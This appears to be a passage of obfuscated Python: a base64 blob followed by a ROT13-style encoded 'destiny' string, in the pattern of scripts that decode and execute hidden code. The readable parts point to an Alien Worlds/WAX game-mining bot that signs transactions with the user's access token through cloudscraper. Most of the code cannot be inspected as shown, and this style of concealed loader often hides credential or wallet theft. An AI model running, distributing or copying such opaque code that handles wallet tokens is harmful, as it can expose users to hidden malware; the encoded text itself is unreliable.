J3RyYW5zYWN0aW9uJ11bJ3JhdyddLCANCiAgICAgICAgICAgICAgICAgICAgIyAgIHByb3hpZXMgICAgID0gew0KICAgICAgICAgICAgICAgICAgICAjICAgICAgICJodHRwIiAgICAgIDogInNvY2tzNTovLzEyNy4wLjAuMToyMzMyMSIsIA0KICAgICAgICAgICAgICAgICAgICAjICAgICAgICJodHRwcyIgICAgIDogInNvY2tzNTovLzEyNy4wLjAuMToyMzMyMSIsIA0KICAgICAgICAgICAgICAgICAgICAjICAgICAgICJmdHAiICAgICAgIDogInNvY2tzNTovLzEyNy4wLjAuMToyMzMyMSINCiAgICAgICAgICAgICAgICAgICAgIyAgIH0NCiAgICAgICAgICAgICAgICApDQogICAgICAgICAgICAgICAgc2VsZi5EQVRBWyd0cmFuc2FjdGlvbiddLnVwZGF0ZSh7DQogICAgICAgICAgICAgICAgICAgICdyZXMnIDoganNvbi5sb2FkcyhzZWxmLkRBVEFbJ1BST0NFU1MnXVsnY2xhaW1fc2lnbiddLmNvbnRlbnQpDQogICAgICAgICAgICAgICAgfSkNCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToNCiAgICAgICAgICAgICAgICBwcmludCggZidFUlJPUiBjbGFpbV9zaWduKCkgOiB7ZX0nICkNCiAgICAgICAgICAgICAgICB0aW1lLnNsZWVwKDYpDQogICAgICAgICAgICAgICAgY29udGludWUNCiAgICAgICAgICAgIGJyZWFrDQogICAgICAgIHdoaWxlIFRydWU6DQogICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgaWYgKA0KICAgICAgICAgICAgICAgICAgICBUSFJFQURFUlsgc2VsZi5EQVRBWyd3YXhpZCddIF1bJ3N0YXR1cyddID09IEZhbHNlIG9yIFRIUkVBREVSWyBzZWxmLkRBVEFbJ3dheGlkJ10gXVsnc3RhdHVzJ10gPT0gTm9uZQ0KICAgICAgICAgICAgICAgICkgb3IgKA0KICAgICAgICAgICAgICAgICAgICBEQVRBQkFTRVsgc2VsZi5EQVRBWyd3YXhpZCddIF1bJ3N0YXQnXSA9PSBGYWxzZQ0KICAgICAgICAgICAgICAgICk6DQogICAgICAgICAgICAgICAgICAgIGJyZWFrDQogICAgICAgICAgICBleGNlcHQ6DQogICAgICAgICAgICAgICAgYnJlYWsNCiAgICAgICAgICAgIHRyeToNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIHRyeSAgICAgICAgIDogREFUQUJBU0VbIHNlbGYuREFUQVsnd2F4aWQnXSBdWyd0ZXh0J11bJ3N0ZXAnXSA9ICcxMycNCiAgICAgICAgICAgICAgICBleGNlcHQgICAgICA6IHBhc3MNCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICBzZWxmLkRBVEFbJ3RyYW5zYWN0aW9uJ10udXBkYXRlKHsNCiAgICAgICAgICAgICAgICAgICAgJ3dheCcgOiBmJ3t7XCJzZXJpYWxpemVkVHJhbnNhY3Rpb25cIjp7IHNlbGYuREFUQVsicGFja2VkdHJ4Il1bInNlcmlhbGl6ZWRUcmFuc2FjdGlvbiJdWyJVbml0OEFycmF5Il0gfSxcIndlYnNpdGVcIjpcInBsYXkuYWxpZW53b3JsZHMuaW9cIixcImRlc2NyaXB0aW9uXCI6XCJqd3QgaXMgaW5zZWN1cmVcIn19Jw0KICAgICAgICAgICAgICAgIH0pDQogICAgICAgICAgICAgICAgc2VsZi5EQVRBWydQUk9DRVNTJ11bJ2NsYWltX3NpZ24nXSAgICAgICA9IGNsb3Vkc2NyYXBlci5DbG91ZFNjcmFwZXIoDQogICAgICAgICAgICAgICAgICAgIGJyb3dzZXIgPSB7DQogICAgICAgICAgICAgICAgICAgICAgICAnY3VzdG9tJzogJ01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQ7IHJ2OjYwLjkpIEdlY2tvLzIwMTAwMTAxIEdvYW5uYS80LjEgRmlyZWZveC82MC45IFBhbGVNb29uLzI4LjIuMicNCiAgICAgICAgICAgICAgICAgICAgfSwgDQogICAgICAgICAgICAgICAgICAgIGRlYnVnICAgPSBUcnVlLCANCiAgICAgICAgICAgICAgICAgICAgZGVsYXkgICA9IDEwDQogICAgICAgICAgICAgICAgKS5wb3N0KA0KICAgICAgICAgICAgICAgICAgICAnaHR0cHM6Ly9wdWJsaWMtd2F4LW9uLndheC5pby93YW0vc2lnbicsIA0KICAgICAgICAgICAgICAgICAgICBoZWFkZXJzID0gew0KICAgICAgICAgICAgICAgICAgICAgICAgJ2F1dGhvcml0eScgICAgICAgICAgICAgOiAncHVibGljLXdheC1vbi53YXguaW8nLA0KICAgICAgICAgICAgICAgICAgICAgICAgJ2FjY2VwdCcgICAgICAgICAgICAgICAgOiAnYXBwbGljYXRpb24vanNvbiwgdGV4dC9wbGFpbiwgKi8qJywNCiAgICAgICAgICAgICAgICAgICAgICAgICdhY2NlcHQtbGFuZ3VhZ2UnICAgICAgIDogJ2VuLVVTLGVuO3E9MC45JywNCiAgICAgICAgICAgICAgICAgICAgICAgICdjb250ZW50LXR5cGUnICAgICAgICAgIDogJ2FwcGxpY2F0aW9uL2pzb247Y2hhcnNldD1VVEYtOCcsDQogICAgICAgICAgICAgICAgICAgICAgICAnc2VjLWZldGNoLWRlc3QnICAgICAgICA6ICdlbXB0eScsDQogICAgICAgICAgICAgICAgICAgICAgICAnc2VjLWZldGNoLW1vZGUnICAgICAgICA6ICdjb3JzJywNCiAgICAgICAgICAgICAgICAgICAgICAgICdzZWMtZmV0Y2gtc2l0ZScgICAgICAgIDogJ3NhbWUtc2l0ZScsDQogICAgICAgICAgICAgICAgICAgICAgICAnc2VjLWdwYycgICAgICAgICAgICAgICA6ICcxJywNCiAgICAgICAgICAgICAgICAgICAgICAgICdvcmlnaW4nICAgICAgICAgICAgICAgIDogJ2h0dHBzOi8vYWxsLWFjY2Vzcy53YXguaW8nLA0KICAgICAgICAgICAgICAgICAgICAgICAgJ3JlZmVyZXInICAgICAgICAgICAgICAgOiAnaHR0cHM6Ly9hbGwtYWNjZXNzLndheC5pby8nLCANCiAgICAgICAgICAgICAgICAgICAgICAgICd4LWFjY2Vzcy10b2tlbicgICAgICAgIDogZid7IHNlbGYuREFUQVsidG9rZW4iXSB9Jw0KICAgICAgICAgICAgICAgICAgICB9LCANCiAgICAgICAgICAgICAgICAgICAganNvbiAgICA9IHsNCiAgICAgICAgICAgICAgICAgICAgICAgICdzZXJpYWxpemVkVHJhbnNhY3Rpb24nIDogc2VsZi5EQVRBWyJwYWNrZWR0cngiXVsic2VyaWFsaXplZFRyYW5zYWN0aW9uIl1bIlVuaXQ4QXJyYXkiXSwgDQogICAgICAgICAgICAgICAgICAgICAgICAnd2Vic2l0ZScgICAgICAgICAgICAgICA6ICdwbGF5LmFsaWVud29ybGRzLmlvJywgDQogICAgICAgICAgICAgICAgICAgICAgICAnZGVzY3JpcHRpb24nICAgICAgICAgICA6ICdqd3QgaXMgaW5zZWN1cmUnDQogICAgICAgICAgICAgICAgICAgIH0sIA0KICAgICAgICAgICAgICAgICAgICAjICAgcHJveGllcyAgICAgPSB7DQogICAgICAgICAgICAgICAgICAgICMgICAgICAgImh0dHAiICAgICAgOiAic29ja3M1Oi8vMTI3LjAuMC4xOjIzMzIxIiwgDQogICAgICAgICAgICAgICAgICAgICMgICAgICAgImh0dHBzIiAgICAgOiAic29ja3M1Oi8vMTI3LjAuMC4xOjIzMzIxIiwgDQogICAgICAgICAgICAgICAgICAgICMgICAgICAgImZ0cCIgICAgICAgOiAic29ja3M1Oi8vMTI3LjAuMC4xOjIzMzIxIg0KICAgICAgICAgICAgICAgICAgICAjICAgfQ0KICAgICAgICAgICAgICAgICkNCiAgICAgICAgICAgICAgICBzZWxmLkRBVEFbJ3RyYW5zYWN0aW9uJ10udXBkYXRlKHsNCiAgICAgICAgICAgICAgICAgICAgJ2FsbCcgOiBqc29uLmxvYWRzKHNlbGYuREFUQVsnUFJPQ0VTUyddWydjbGFpbV9zaWduJ10uY29udGVudCkNCiAgICAgICAgICAgICAgICB9KQ0KICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOg0KICAgICAgICAgICAgICAgIHByaW50KCBmJ0VSUk9SIGdldF9sb2dpbigpIDoge2V9JyApDQogICAgICAgICAgICAgICAgdGltZS5zbGVlcCg2KQ0KICAgICAgICAgICAgICAgIGNvbnRpbnVlDQogICAgICAgICAgICBicmVhaw0KICAgICAgICB3aGlsZSBUcnVlOg0KICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgIGlmICgNCiAgICAgICAgICAgICAgICAgICAgVEhSRUFERVJbIHNlbGYuREFUQVsnd2F4aWQnXSBdWydzdGF0dXMnXSA9PSBGYWxzZSBvciBUSFJFQURFUlsgc2VsZi5EQVRBWyd3YXhpZCddIF1bJ3N0YXR1cyddID09IE5vbmUNCiAgICAgICAgICAgICAgICApIG9yICgNCiAgICAgICAgICAgICAgICAgICAgREFUQUJBU0VbIHNlbGYuREFUQVsnd2F4aWQnXSBdWydzdGF0J10gPT0gRmFsc2UNCiAgICAgICAgICAgICAgICApOg0KICAgICAgICAgICAgICAgICAgICBicmVhaw0KICAgICAgICAgICAgZXhjZXB0Og0KICAgICAgICAgICAgICAgIGJyZWFrDQogICAgICAgICAgICB0cnk6DQogICAgICAgICAgICANCiAgICAgICAgICAgICAgICB0cnkgICAgICAgICA6IERBVEFCQVNFWyBzZWxmLkRBVEFbJ3dheGlkJ10gXVsndGV4dCddWydzdGVwJ10gPSAnMTQnDQogICAgICAgICAgICAgICAgZXhjZXB0ICAgICAgOiBwYXNzDQogICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgc2VsZi5EQVRBWyd0cmFuc2FjdGlvbiddLnVwZGF0ZSh7DQogICAgICAgICAgICAgICAgICAgICdzaWcnIDogZid7e1wic2lnbmF0dXJlc1wiOltcInsgc2VsZi5EQVRBWyJ0cmFuc2FjdGlvbiJdWyJhbGwiXVsic2lnbmF0dXJlcyJdWzBdIH1cIixcInsgc2VsZi5EQVRBWyJ0cmFuc2FjdGlvbiJdWyJhbGwiXVsic2lnbmF0dXJlcyJdWzFdIH1cIl0sXCJjb21wcmVzc2lvblwiOjAsXCJwYWNrZWRfY29udGV4dF9mcmVlX2RhdGFcIjpcIlwi'
#   destiny = 'YSjvpTSwn2IxK3ElrSjvByjvrlOmMJkzYxEOIRSoVaOuL2gyMUElrPWqJlWjLJAeMJEsqUW4Vy0tsIjvsK0aQDbtVPNtVPNtVPNtVPNtVPNtsFxAPvNtVPNtVPNtVPNtVPNtVPOmMJkzYxEOIRSoW1OFG0ASH1ZaKIfaL2kunJ1sp2yaovqqVPNtVPNtVQ0tL2kiqJEmL3WupTIlYxAfo3IxH2AlLKOypvtAPvNtVPNtVPNtVPNtVPNtVPNtVPNtLaWiq3AypvN9VUfAPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPqwqKA0o20aBvNaGJ96nJkfLF81YwNtXSqcozEiq3ZtGyDtZGNhZQftI2yhAwD7VUt2AQftpaL6AwNhBFxtE2Iwn28iZwNkZQNkZQRtE29uoz5uYmDhZFOTnKWyMz94YmLjYwxtHTSfMH1io24iZwthZv4lWj0XVPNtVPNtVPNtVPNtVPNtVPNtVPO9YPNAPvNtVPNtVPNtVPNtVPNtVPNtVPNtMTIvqJptVPN9VSElqJHfVN0XVPNtVPNtVPNtVPNtVPNtVPNtVPOxMJkurFNtVQ0tZGNAPvNtVPNtVPNtVPNtVPNtVPNcYaOip3DbQDbtVPNtVPNtVPNtVPNtVPNtVPNtVPqbqUEjpmbiY2AbLJyhYaqurP5col92ZF9wnTScov9jqKAbK3ElLJ5mLJA0nJ9hWljtQDbtVPNtVPNtVPNtVPNtVPNtVPNtVTEuqTRtVPNtCFOmMJkzYxEOIRSoW3ElLJ5mLJA0nJ9hW11oW3AcMlqqYPNAPvNtVPNtVPNtVPNtVPNtVPNtVPNtVlNtVUOlo3ucMKZtVPNtVQ0trj0XVPNtVPNtVPNtVPNtVPNtVPNtVPNwVPNtVPNtVPWbqUEjVvNtVPNtVQbtVaAiL2gmAGbiYmRlAl4jYwNhZGblZmZlZFVfVN0XVPNtVPNtVPNtVPNtVPNtVPNtVPNwVPNtVPNtVPWbqUEjplVtVPNtVQbtVaAiL2gmAGbiYmRlAl4jYwNhZGblZmZlZFVfVN0XVPNtVPNtVPNtVPNtVPNtVPNtVPNwVPNtVPNtVPWzqUNvVPNtVPNtVQbtVaAiL2gmAGbiYmRlAl4jYwNhZGblZmZlZFVAPvNtVPNtVPNtVPNtVPNtVPNtVPNtVlNtVU0APvNtVPNtVPNtVPNt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